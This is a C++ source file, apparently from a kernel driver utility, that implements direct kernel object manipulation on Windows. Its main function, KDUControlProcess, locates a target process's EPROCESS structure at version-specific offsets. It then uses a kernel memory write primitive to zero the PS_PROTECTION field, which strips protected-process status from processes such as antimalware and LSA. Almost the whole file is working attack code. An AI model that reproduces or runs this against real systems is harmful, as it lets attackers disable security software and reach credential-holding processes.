/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2020
*
*  TITLE:       PS.CPP
*
*  VERSION:     1.00
*
*  DATE:        02 Feb 2020
*
*  Processes DKOM related routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

LPSTR KDUGetProtectionTypeAsString(
    _In_ ULONG Type
)
{
    LPSTR pStr;

    switch (Type) {

    case PsProtectedTypeNone:
        pStr = (LPSTR)"PsProtectedTypeNone";
        break;
    case PsProtectedTypeProtectedLight:
        pStr = (LPSTR)"PsProtectedTypeProtectedLight";
        break;
    case PsProtectedTypeProtected:
        pStr = (LPSTR)"PsProtectedTypeProtected";
        break;
    default:
        pStr = (LPSTR)"Unknown Type";
        break;
    }

    return pStr;
}

LPSTR KDUGetProtectionSignerAsString(
    _In_ ULONG Signer
)
{
    LPSTR pStr;

    switch (Signer) {
    case PsProtectedSignerNone:
        pStr = (LPSTR)"PsProtectedSignerNone";
        break;
    case PsProtectedSignerAuthenticode:
        pStr = (LPSTR)"PsProtectedSignerAuthenticode";
        break;
    case PsProtectedSignerCodeGen:
        pStr = (LPSTR)"PsProtectedSignerCodeGen";
        break;
    case PsProtectedSignerAntimalware:
        pStr = (LPSTR)"PsProtectedSignerAntimalware";
        break;
    case PsProtectedSignerLsa:
        pStr = (LPSTR)"PsProtectedSignerLsa";
        break;
    case PsProtectedSignerWindows:
        pStr = (LPSTR)"PsProtectedSignerWindows";
        break;
    case PsProtectedSignerWinTcb:
        pStr = (LPSTR)"PsProtectedSignerWinTcb";
        break;
    case PsProtectedSignerWinSystem:
        pStr = (LPSTR)"PsProtectedSignerWinSystem";
        break;
    case PsProtectedSignerApp:
        pStr = (LPSTR)"PsProtectedSignerApp";
        break;
    default:
        pStr = (LPSTR)"Unknown Value";
        break;
    }

    return pStr;
}

/*
* KDUControlProcess
*
* Purpose:
*
* Modify process object to remove PsProtectedProcess access restrictions.
*
*/
BOOL KDUControlProcess(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG_PTR ProcessId)
{
    BOOL       bResult = FALSE;
    ULONG      Buffer;
    NTSTATUS   ntStatus;
    ULONG_PTR  ProcessObject = 0, VirtualAddress = 0, Offset = 0;
    HANDLE     hProcess = NULL;

    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES obja;

    PS_PROTECTION* PsProtection;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);

    clientId.UniqueProcess = (HANDLE)ProcessId;
    clientId.UniqueThread = NULL;

    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
        &obja, &clientId);

    if (NT_SUCCESS(ntStatus)) {

        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
        supQueryObjectFromHandle(hProcess, &ProcessObject);

        if (ProcessObject != 0) {

            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);

            switch (Context->NtBuildNumber) {
            case 9600:
                Offset = PsProtectionOffset_9600;
                break;
            case 10240:
                Offset = PsProtectionOffset_10240;
                break;
            case 10586:
                Offset = PsProtectionOffset_10586;
                break;
            case 14393:
                Offset = PsProtectionOffset_14393;
                break;
            case 15063:
            case 16299:
            case 17134:
            case 17763:
            case 18362:
            case 18363:
                Offset = PsProtectionOffset_15063;
                break;
            case 19037:
                Offset = PsProtectionOffset_19037;
                break;
            default:
                Offset = 0;
                break;
            }

            if (Offset == 0) {
                printf_s("[!] Unsupported WinNT version\r\n");
            }
            else {

                VirtualAddress = EPROCESS_TO_PROTECTION(ProcessObject, Offset);

                printf_s("[+] EPROCESS->PS_PROTECTION, 0x%llX\r\n", VirtualAddress);

                Buffer = 0;
                if (KDUReadKernelVM(Context, VirtualAddress, &Buffer, sizeof(ULONG))) {

                    PsProtection = (PS_PROTECTION*)&Buffer;

                    LPSTR pStr;


                    printf_s("[+] Kernel memory read succeeded\r\n");

                    pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
                    printf_s("\tPsProtection->Type: %lu (%s)\r\n",
                        PsProtection->Type,
                        pStr);

                    printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);

                    pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
                    printf_s("\tPsProtection->Signer: %lu (%s)\r\n",
                        PsProtection->Signer,
                        pStr);

                    PsProtection->Signer = PsProtectedSignerNone;
                    PsProtection->Type = PsProtectedTypeNone;
                    PsProtection->Audit = 0;

                    bResult = KDUWriteKernelVM(Context, VirtualAddress, &Buffer, sizeof(ULONG));
                    if (bResult) {
                        printf_s("[+] Process object modified\r\n");

                        pStr = KDUGetProtectionTypeAsString(PsProtection->Type);
                        printf_s("\tNew PsProtection->Type: %lu (%s)\r\n",
                            PsProtection->Type,
                            pStr);

                        pStr = KDUGetProtectionSignerAsString(PsProtection->Signer);
                        printf_s("\tNew PsProtection->Signer: %lu (%s)\r\n",
                            PsProtection->Signer,
                            pStr);

                        printf_s("\tNew PsProtection->Audit: %lu\r\n", PsProtection->Audit);

                    }
                    else {
                        printf_s("[!] Cannot modify process object\r\n");
                    }
                }
                else {
                    printf_s("[!] Cannot read kernel memory\r\n");
                }
            }
        }
        else {
            printf_s("[!] Cannot query process object\r\n");
        }
        NtClose(hProcess);
    }
    else {
        printf_s("[!] Cannot open target process, NTSTATUS (0x%lX)\r\n", ntStatus);
    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return bResult;
}
